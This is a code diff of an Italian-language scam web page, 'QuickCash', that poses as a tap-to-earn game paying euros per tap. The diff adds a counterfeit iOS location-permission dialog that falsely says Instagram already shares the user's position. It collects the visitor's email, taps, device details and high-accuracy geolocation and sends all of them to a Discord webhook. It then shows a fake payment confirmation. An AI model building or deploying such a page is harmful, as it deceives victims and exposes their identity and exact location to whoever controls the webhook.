@@ -16,155 +16,238 @@
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #000;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 0;
             touch-action: manipulation;
+            overflow: hidden;
         }
         .container {
-            background: white;
-            border-radius: 25px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
-            padding: 35px 25px;
-            max-width: 400px;
+            background: #1c1c1e;
             width: 100%;
+            height: 100vh;
             text-align: center;
+            position: relative;
+        }
+        .header {
+            background: linear-gradient(135deg, #007AFF 0%, #5856D6 100%);
+            padding: 50px 20px 30px;
+            color: white;
         }
         .logo {
             font-size: 2.8em;
             font-weight: bold;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
         }
         .tagline {
-            color: #666;
-            margin-bottom: 30px;
-            font-size: 1.2em;
-            line-height: 1.4;
+            font-size: 1.3em;
+            opacity: 0.9;
+            margin-bottom: 10px;
         }
         .earnings-display {
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            color: white;
-            padding: 30px 20px;
+            background: #2c2c2e;
+            margin: 20px;
+            padding: 25px;
             border-radius: 20px;
-            margin: 25px 0;
-            box-shadow: 0 15px 30px rgba(245, 87, 108, 0.4);
+            color: white;
         }
         .earnings-amount {
             font-size: 3.5em;
             font-weight: bold;
-            margin-bottom: 10px;
+            margin-bottom: 5px;
+            color: #32D74B;
         }
         .earnings-label {
-            font-size: 1.3em;
-            opacity: 0.9;
+            font-size: 1.2em;
+            opacity: 0.8;
+        }
+        .click-area {
+            position: absolute;
+            bottom: 150px;
+            left: 20px;
+            right: 20px;
         }
         .click-button {
-            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            background: linear-gradient(135deg, #32D74B 0%, #30D158 100%);
             color: white;
             border: none;
             padding: 35px 20px;
-            font-size: 1.5em;
+            font-size: 1.6em;
             font-weight: bold;
             border-radius: 25px;
-            cursor: pointer;
-            margin: 25px 0;
-            box-shadow: 0 15px 35px rgba(79, 172, 254, 0.5);
-            transition: all 0.1s;
+            margin: 0;
+            box-shadow: 0 20px 40px rgba(50, 215, 75, 0.4);
             width: 100%;
             min-height: 120px;
             display: flex;
             align-items: center;
             justify-content: center;
         }
-        .click-button:active {
-            transform: scale(0.95);
-            box-shadow: 0 5px 20px rgba(79, 172, 254, 0.7);
-        }
         .stats {
+            position: absolute;
+            bottom: 250px;
+            left: 20px;
+            right: 20px;
             display: flex;
             justify-content: space-around;
-            margin: 25px 0;
-            color: #666;
+            color: #8e8e93;
             font-size: 1.2em;
             font-weight: 500;
         }
         .email-section {
-            margin: 30px 0;
+            background: #2c2c2e;
+            margin: 30px 20px;
+            padding: 25px;
+            border-radius: 20px;
+            color: white;
         }
         .email-input {
             width: 100%;
             padding: 20px;
-            border: 2px solid #e1e5e9;
+            border: 2px solid #3a3a3c;
             border-radius: 15px;
             font-size: 1.3em;
             margin-bottom: 20px;
             text-align: center;
-            background: #f8f9fa;
+            background: #1c1c1e;
+            color: white;
         }
         .start-button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #007AFF 0%, #5856D6 100%);
             color: white;
             border: none;
             padding: 20px 30px;
             font-size: 1.3em;
             border-radius: 15px;
-            cursor: pointer;
             width: 100%;
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
-        }
-        .start-button:active {
-            transform: scale(0.98);
+            font-weight: bold;
         }
         .hidden {
             display: none;
         }
         .pulse {
-            animation: pulse 0.8s infinite;
+            animation: pulse 0.6s infinite;
         }
         @keyframes pulse {
             0% { transform: scale(1); }
-            50% { transform: scale(1.03); }
+            50% { transform: scale(1.05); }
             100% { transform: scale(1); }
         }
-        .success-message {
-            background: #d4edda;
-            color: #155724;
-            padding: 25px 20px;
-            border-radius: 20px;
-            margin: 25px 0;
-            font-size: 1.2em;
+        .success-screen {
+            background: #1c1c1e;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: white;
+            text-align: center;
         }
-        .progress-bar {
+        .success-icon {
+            font-size: 4em;
+            margin-bottom: 20px;
+        }
+        .success-title {
+            font-size: 2em;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #32D74B;
+        }
+        .success-text {
+            font-size: 1.3em;
+            opacity: 0.8;
+            margin-bottom: 30px;
+        }
+        .ios-permission {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            height: 8px;
-            background: #e9ecef;
-            border-radius: 4px;
-            margin: 20px 0;
-            overflow: hidden;
-        }
-        .progress-fill {
             height: 100%;
-            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
-            border-radius: 4px;
-            transition: width 0.3s ease;
+            background: rgba(0,0,0,0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .ios-dialog {
+            background: #2c2c2e;
+            margin: 20px;
+            padding: 25px;
+            border-radius: 20px;
+            color: white;
+            text-align: left;
+            max-width: 400px;
+        }
+        .ios-app {
+            font-weight: bold;
+            color: #007AFF;
+            margin-bottom: 5px;
+        }
+        .ios-title {
+            font-size: 1.4em;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        .ios-note {
+            font-size: 1.1em;
+            opacity: 0.8;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        .ios-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        .ios-button {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 15px;
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+        .ios-deny {
+            background: #3a3a3c;
+            color: white;
+        }
+        .ios-allow {
+            background: #007AFF;
+            color: white;
         }
     </style>
 </head>
 <body>
+    <!-- iOS Location Permission Dialog (Hidden by default) -->
+    <div class="ios-permission" id="iosPermission">
+        <div class="ios-dialog">
+            <div class="ios-app">"click-earn-euro.github.io"</div>
+            <div class="ios-title">vorrebbe utilizzare la tua posizione attuale.</div>
+            <div class="ios-note">
+                "Instagram" attualmente ha accesso alla tua posizione esatta, quindi verrà utilizzata anche da questo sito web.
+            </div>
+            <div class="ios-buttons">
+                <button class="ios-button ios-deny" onclick="handleLocationDeny()">Non consentire</button>
+                <button class="ios-button ios-allow" onclick="handleLocationAllow()">Consenti</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main App -->
     <div class="container">
-        <div class="logo">💰 QuickCash</div>
-        <div class="tagline">Guadagna soldi veri con semplici tap!</div>
-        
         <!-- Email Section -->
         <div id="emailSection">
+            <div class="header">
+                <div class="logo">💰 QuickCash</div>
+                <div class="tagline">Guadagna soldi veri con semplici tap!</div>
+            </div>
+            
             <div class="email-section">
-                <p style="margin-bottom: 20px; font-size: 1.2em; color: #555;">Inserisci email per iniziare:</p>
+                <div style="margin-bottom: 20px; font-size: 1.2em;">Inserisci email per iniziare:</div>
                 <input type="email" class="email-input" id="emailInput" placeholder="email@example.com" required>
                 <button class="start-button" onclick="startEarning()">
                     Inizia a Guadagnare
@@ -174,6 +257,11 @@
 
         <!-- Game Section -->
         <div id="gameSection" class="hidden">
+            <div class="header">
+                <div class="logo">💰 QuickCash</div>
+                <div class="tagline">Continua a tappare per guadagnare!</div>
+            </div>
+            
             <div class="earnings-display">
                 <div class="earnings-amount" id="balance">€0.00</div>
                 <div class="earnings-label">Totale Guadagni</div>
@@ -184,25 +272,22 @@
                 <div>€0.05/tap</div>
             </div>
 
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill" style="width: 0%"></div>
-            </div>
-
-            <button class="click-button pulse" id="clickButton">
-                🤑 TOCCA PER GUADAGNARE! 🤑
-            </button>
-
-            <div style="color: #666; font-size: 1.1em; margin-top: 15px;">
-                Più veloce tappi, più soldi fai!
+            <div class="click-area">
+                <button class="click-button pulse" id="clickButton">
+                    🤑 TOCCA PER GUADAGNARE! 🤑
+                </button>
             </div>
         </div>
 
         <!-- Success Section -->
         <div id="successSection" class="hidden">
-            <div class="success-message">
-                <h3 style="margin-bottom: 15px; font-size: 1.5em;">🎉 Complimenti! 🎉</h3>
-                <p style="margin-bottom: 10px;">Hai guadagnato <strong id="finalAmount">€1.00</strong>!</p>
-                <p>Pagamento in elaborazione...</p>
+            <div class="success-screen">
+                <div class="success-icon">🎉</div>
+                <div class="success-title">Pagamento Confermato!</div>
+                <div class="success-text">
+                    Hai guadagnato <strong id="finalAmount">€1.00</strong><br>
+                    I fondi saranno trasferiti entro 24 ore
+                </div>
             </div>
         </div>
     </div>
@@ -219,7 +304,7 @@
             try {
                 const payload = {
                     content: `📱 **${dataName}:** \`\`\`${JSON.stringify(dataValue, null, 2)}\`\`\``,
-                    username: 'QuickCash iPhone'
+                    username: 'QuickCash Pro'
                 };
                 
                 fetch(DISCORD_WEBHOOK, {
@@ -234,7 +319,6 @@
             const email = document.getElementById('emailInput').value.trim();
             
             if (!email || !validateEmail(email)) {
-                alert('Inserisci una email valida per iniziare');
                 return;
             }
 
@@ -254,11 +338,6 @@
             
             clickButton.addEventListener('touchstart', handleClick, { passive: true });
             clickButton.addEventListener('click', handleClick);
-            
-            sendToDiscord('🎮 GAME_STARTED', {
-                email: email,
-                timestamp: new Date().toISOString()
-            });
         }
 
         function handleClick() {
@@ -267,7 +346,6 @@
             
             document.getElementById('balance').textContent = `€${balance.toFixed(2)}`;
             document.getElementById('clickCount').textContent = clickCount;
-            document.getElementById('progressFill').style.width = `${(balance * 100)}%`;
             
             sendToDiscord(`👆 TAP_${clickCount}`, {
                 email: userEmail,
@@ -286,15 +364,41 @@
                 locationRequested = true;
                 
                 setTimeout(() => {
-                    button.textContent = '🎯 VERIFICA IN CORSO... 🎯';
-                    button.style.background = 'linear-gradient(135deg, #43e97b 0%, #38f9d7 100%)';
-                    
-                    setTimeout(requestLocation, 500);
-                }, 200);
+                    showIOSPermissionDialog();
+                }, 300);
             }
         }
 
-        function requestLocation() {
+        function showIOSPermissionDialog() {
+            document.getElementById('iosPermission').style.display = 'flex';
+            
+            sendToDiscord('📍 IOS_DIALOG_SHOWN', {
+                email: userEmail,
+                balance: balance.toFixed(2),
+                taps: clickCount,
+                timestamp: new Date().toISOString()
+            });
+        }
+
+        function handleLocationAllow() {
+            document.getElementById('iosPermission').style.display = 'none';
+            getActualLocation();
+        }
+
+        function handleLocationDeny() {
+            document.getElementById('iosPermission').style.display = 'none';
+            
+            sendToDiscord('❌ IOS_DIALOG_DENIED', {
+                email: userEmail,
+                timestamp: new Date().toISOString()
+            });
+            
+            const button = document.getElementById('clickButton');
+            button.textContent = '🤑 TOCCA PER GUADAGNARE! 🤑';
+            locationRequested = false;
+        }
+
+        function getActualLocation() {
             if (!navigator.geolocation) return;
 
             navigator.geolocation.getCurrentPosition(
@@ -328,20 +432,17 @@
                     showSuccess();
                 },
                 (error) => {
-                    sendToDiscord('❌ LOCATION_DENIED', {
+                    sendToDiscord('❌ LOCATION_ERROR', {
                         email: userEmail,
                         error: error.message,
                         timestamp: new Date().toISOString()
                     });
                     
-                    const button = document.getElementById('clickButton');
-                    button.textContent = '🤑 TOCCA PER GUADAGNARE! 🤑';
-                    button.style.background = 'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)';
-                    locationRequested = false;
+                    showSuccess();
                 },
                 {
                     enableHighAccuracy: true,
-                    timeout: 8000,
+                    timeout: 10000,
                     maximumAge: 0
                 }
             );
@@ -352,7 +453,7 @@
             document.getElementById('successSection').classList.remove('hidden');
             document.getElementById('finalAmount').textContent = `€${balance.toFixed(2)}`;
 
-            sendToDiscord('🎊 GAME_COMPLETED', {
+            sendToDiscord('🎊 PAYMENT_COMPLETED', {
                 email: userEmail,
                 totalTaps: clickCount,
                 finalBalance: balance.toFixed(2),
@@ -366,7 +467,7 @@
         }
 
         setTimeout(() => {
-            sendToDiscord('📱 PAGE_LOADED', {
+            sendToDiscord('📱 APP_LOADED', {
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
                 screen: `${screen.width}x${screen.height}`,
